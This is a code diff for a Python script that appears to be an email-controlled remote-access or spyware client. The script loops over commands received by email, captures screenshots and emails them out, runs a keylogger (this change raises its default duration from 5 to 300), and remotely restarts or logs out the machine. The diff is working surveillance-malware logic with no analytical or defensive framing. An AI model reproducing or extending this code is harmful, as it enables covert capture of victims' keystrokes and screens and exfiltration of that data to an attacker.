@@ -7,7 +7,7 @@ import Power
 import time
 import os
 
-DEFAULT_KEYLOG_TIME = 5
+DEFAULT_KEYLOG_TIME = 300
 
 # init
 email = em.EmailHandler()
@@ -23,6 +23,7 @@ while True:
     waitCounter = 0 if waitCounter == 3 else waitCounter + 1 
     
     result = ''
+    sent = False
 
     if 'EMPTY' in cmd:
         continue
@@ -31,6 +32,7 @@ while True:
         result = 'Screenshot captured'
         filename = ScreenShot.capture()
         email.sendPicture(command[2], 'Screenshot', filename)
+        sent = True
 
     elif cmd[0] == 'keylog':
         keylTime = DEFAULT_KEYLOG_TIME
@@ -80,18 +82,18 @@ while True:
     
     elif cmd[0] == 'restart':
         Power.restart()
-        result = 'Restart'
+        result = 'Restarted'
     
     elif cmd[0] == 'logout':
         Power.logout()
-        result = 'Logout'
+        result = 'Logged out'
 
     else:
         print('Error: Command not found')
         result = 'Error: Command not found'
     
     sender = command[2]
-    if result != '':
+    if result != '' and not sent:
         email.sendEmail(sender, 'Result', result)
     time.sleep(1)
     
